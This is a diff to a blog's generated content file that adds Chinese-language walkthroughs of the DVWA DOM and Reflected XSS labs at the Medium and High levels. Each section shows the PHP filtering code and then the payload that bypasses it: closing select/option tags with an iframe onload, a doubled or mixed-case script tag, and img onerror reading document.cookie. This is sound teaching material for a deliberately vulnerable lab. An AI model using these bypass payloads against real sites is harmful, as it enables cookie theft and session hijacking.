@@ -1166,10 +1166,37 @@
 </ul>
 <p>​    我们发现上方 url 处多了一串字符 “ <strong>?default=English</strong> “</p>
 <ul>
-<li><p>我们可以直接构造语句” <strong>default=<script>alert(/xss/)</script></strong> “</p>
+<li><p>我们可以直接构造语句</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 <img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/3.png" alt="3" style="zoom:67%;"></li>
 </ul>
 <hr>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源码分析：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">	<span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Do not allow script tags</span></span><br><span class="line">	<span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">		header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以发现<code>&lt;script&gt;</code>被过滤掉了。</p>
+<ul>
+<li><p>那我们可以使用闭合<code>&lt;/option&gt;&lt;/select&gt;</code>标签构造xss事件。</p>
+</li>
+<li><p>键入 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;iframe onload=alert(/xss/)&gt;</code></p>
+<p><img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/4.png" alt="4"></p>
+</li>
+</ul>
+<hr>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>一样的先分析源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># White list the allowable languages</span></span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">			<span class="comment"># ok</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们发现只允许default=French、English、German、Spanish、这几个通过。</p>
+<ul>
+<li><p>非常明显的<strong>白名单过滤</strong></p>
+</li>
+<li><p>所以我们需要绕过白名单进行过滤</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">default=English#<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/5.png" alt="5"></p>
+</li>
+</ul>
 ]]></content>
       <tags>
         <tag>-DVWA</tag>
@@ -1259,19 +1286,21 @@
 
 <p>我们会发现没有任何的过滤和检查。那我们可以直接攻击。</p>
 <ul>
-<li>构造    <script>alert(1)</script>    输入。</li>
-<li><img src="https://colson-max.github.io/2022/05/06/DVWA-XSS-Reflected/1.png" alt="1"></li>
+<li><p>构造</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p><img src="https://colson-max.github.io/2022/05/06/DVWA-XSS-Reflected/1.png" alt="1"></p>
+</li>
 </ul>
 <hr>
 <h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>同样我们点开源码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
-<p>我们可以看到源码中，使用 <strong>str_replace</strong> 函数将输入的 <strong><script></strong> 删除。也就实现了 <script> 的过滤。</p>
+<p>我们可以看到源码中，使用 <strong>str_replace</strong> 函数将输入的<code>&lt;script&gt;</code>删除。也就实现了<code>&lt;script&gt;</code>的过滤。</p>
 <ul>
 <li><p>双写绕过</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/./DVWA-XSS-Reflected/2.png" alt="2"></p>
+<p><img src="https://colson-max.github.io/2022/05/06/DVWA-XSS-Reflected/2.png" alt="2"></p>
 </li>
 <li><p>大小写绕过</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
@@ -1279,7 +1308,18 @@
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>这三种方法都可以绕过过滤，达到我们的预期效果。</p>
-</script></strong></p>]]></content>
+<hr>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>打开源码分析：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>代码使用了<code>preg_replace</code>函数执行一个正则表达式的搜索和替换，其中<code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code>是正则表达式<code>(.*)</code>表示贪婪匹配，<code>/i</code>表示不区分大小写</li>
+<li>所以在High级别的代码中，所有关于<code>&lt;script&gt;</code>标签均被过滤删除了</li>
+</ul>
+<p>不过我们可以通过输入其它标签的方法来进行过滤：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
       <tags>
         <tag>-DVWA</tag>
         <tag>-XSS</tag>
